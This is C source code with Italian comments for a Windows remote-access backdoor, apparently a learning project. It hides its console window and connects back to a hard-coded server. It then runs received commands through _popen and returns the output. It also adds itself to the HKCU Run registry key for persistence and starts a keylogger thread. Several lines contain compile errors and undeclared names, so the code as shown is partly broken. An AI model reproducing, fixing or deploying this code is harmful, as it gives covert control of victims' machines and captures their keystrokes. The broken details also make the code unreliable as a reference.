#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h> //winsock programming
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "keylogger.h"

#define bzero(p, size) (void) memset((p), 0, (size)) //definisco bzero, una funzione che fa il memset a 0

//file descriptor del socket
int sock;

//funzione per per attivare la persistence aggiungo il malware ai registri di windows per avviare l' applicazione all' avvio del PC
int bootRun(){ //mette nei registri di windows il mio programma cosiche si starta ad ogni reboot
	char err[128] = "Failed\n";
	char suc[128] = "Created Persisence At: : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
	//TCHAR e' un tipo di variabile char che comprende sia Ansi che Unicode
	TCHAR szPath[MAX_PATH];
	//DWORD e' un tipo di dati a 32 bit utile per rappresentare interi
	DWORD pathLen = 0;

	//GetModuleFileName() si usa per ottenere il percorso completo di un modulo(in questo caso il modulo del nostro file,
	// ovvero chi ha chiamato la funzione perche' l' argomento e' messo a NULL) e metterlo in szPath
	pathLen = GetModuleFileName(NULL,szPath,MAX_PATH);

	//controllo se sono riuscito ad ottenere il path
	if(pathLen == 0){
		send(sock, err, sizeof(err), 0);
		return -1
	}
	
	//HKEY è un'abbreviazione di "Handle Key". In Windows, un handle è un puntatore a un oggetto di sistema. 
	//In questo caso, un HKEY è un puntatore a una chiave del Registro di sistema.
	HKEY NewVal;

	//provo ad aprire la chiave del registro di sistema(dei programmi al boot) dell' utente corrente con RegOpenKey() e ne metto il puntatore in NewVal
	if(RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS){
		send(sock, err, sizeof(err));
		return -1;
	}
	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
	//Metto la stringa Hacked alla variabile NewVal con il path al mio malware
	if (RegSetValueEx(NewVal, TEXT("Hacked"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS){
		RegCloseKey(NewVal);
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	//chiudo la chiave
	RegCloseKey(NewVal);
	//mando output di debugging
	send(sock,suc,sizeof(suc),0);
	return 0;

}

//semplice funzione copiata che tronca le stringhe
char *str_cut(char str[], int slice_from, int slice_to){ 
	if (str[0] == '\0')
		return NULL;

	char *buffer;
	size_t str_len, buffer_len;

	if (slice_to < 0 && slice_from > slice_to) {
		str_len = strlen(str);
		if (abs(slice_to) > str_len - 1)
			return NULL;

		if (abs(slice_from) > str_len)
			slice_from = (-1) * str_len;

		buffer_len = slice_to - slice_from;
		str += (str_len + slice_from);

	} else if (slice_from >= 0 && slice_to > slice_from) {
		str_len = strlen(str);

		if (slice_from > str_len - 1)
			return NULL;
		buffer_len = slice_to - slice_from;
		str += slice_from;

	} else
		return NULL;

	buffer = calloc(buffer_len, sizeof(char));
	strncpy(buffer, str, buffer_len);
	return buffer;
}

//funzione che riceve comandi dal server e li esegue sull' host e manda output al server
void Shell(){
	char buffer[1024]; //buffer per mettere i comandi
	char container[1024];
	char total_response[18384];

	while (1) {
		//memseto a 0 tutti i buffer
		bzero(buffer, sizeof(buffer));
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));

		//ricevo comandi dal server e li metto nel buffer
		recv(sock,buffer,sizeof(buffer), 0); 

		if strcmp("q",buffer,1) == 0{ //guardo se ho ricevuto q come comando, e chiudo la connessione
			closesocket(sock);//chiudo socket
			WSACleanup();     //cleano il WindowsSocket
			exit(1);
		}
		else if (strncmp("cd ", buffer, 3) == 0){ //ancora devo capire perche' devo esplicitarlo
			chdir(str_cut(buffer, 3));
		}
		else if (strncmp("persist", buffer,7) == 0){//per attivare la persistence aggiungo il malware ai registri di windows per avviare l' applicazione all' avvio del PC
			bootRun();
		}
		else if (strncmp("keylog_start", buffer, 12) == 0){//attivo il keylogger creando e assegnandolo ad un thread( funzione di callback: logg)
			HANDLE thread = CreateThread(NULL, 0,logg, NULL, 0, NULL);
			continue;
		}
		else{//eseguo i comandi contenuti nel buffer con _popen() 
			FILE *fp; //creo un file descriptor
			fp = _popen(buffer, "r");//crea un pipe tra processo padre e figlio ed esegue cio' che e' contenuto nel buffer, r significa che posso leggere dal file
			
			//leggo il file descriptor e metto cio' che leggo in container
			while(fgets(container,1024,fp) != NULL) { 
				strcat(total_response,container); //concateno cio' che leggo nel container a total_response
			}
			//mando l' output al server
			send(sock, total_response, sizeof(total_response), 0);
			//chiudo il file descriptor
			fclose(fp);	
		}
	}

}




//api entry main() per Windows
//hInstance: è l'handle dell'istanza dell'applicazione. Viene utilizzato dal sistema operativo per identificare l'applicazione in memoria.
//hPrevInstance: è l'handle dell'istanza precedente dell'applicazione. Se non è presente alcuna istanza precedente, questo valore è NULL.
//lpCmdLine: è un puntatore a una stringa che contiene gli argomenti della linea di comando.
//nCmdShow: è un intero che indica se la finestra principale dell'applicazione deve essere visualizzata minimizzata, massimizzata o normalmente
int APIENTRY WinMain(HISTANCE hInstance,HISTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {

	HWND stealth;		//creo un' handle a una Finestra
	AllocateConsole();	//crea una console, interfaccia a linea di comando
	stealth = FindWindowA("ConsoleWindowClass",NULL); //attacco  stealth all' handle della console appena creata

	ShowWindow(stealth, 0); //0 significa nascondere la finestra stealth

	struct sockaddr_in ServAddr;  //struct per tutte le info del server
	unsigned short ServerPort; //porta di utilizzo
	char *ServIP;			//IP DI UTILIZZO
	WSDATA wsData; //WSDATA e' una struct usata per immagazzinare dati su Windows Socket

	ServIP = "192.168.1.23"; //specificare indirizzo ip del server
	ServPort = 50005;

	if (WSAStartup(MAKEWORD(2,0), &wsaData ) != 0){ //WSAStartup si usa per inizializzare l'uso di Windows Socket (WS)
		exit(1);    //esco se ho fallito a creare il socket
	}

	sock = socket(AF_INET,SOCK_STREAM,0);//AF_INET significa che stiamo connettendo con IPv4,SOCK_STREAM usiamo TCP

	memset(&ServAddr,0,sizeof(ServAddr)); //clearo tutta la struct ServAddr a 0
	//setuppo la struct
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);//inet_addr() converte stringa a struct indirizzo IP
	ServAddr.sin_port = htons(ServPort);//htons converte integer a formato Porta
	
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0){
		Sleep(10);
		continue;
	}

	//apri una messageBox (facoltativa)
	MessageBox(NULL,TEXT("Your device has been Hacked !!"),TEXT("Windows Installer"), MB_OK | MB_ICONERROR);
	

	//chiamo la funzione shell
	//funzione che riceve comandi dal server e li esegue sull' host e manda output al server
	Shell();
}
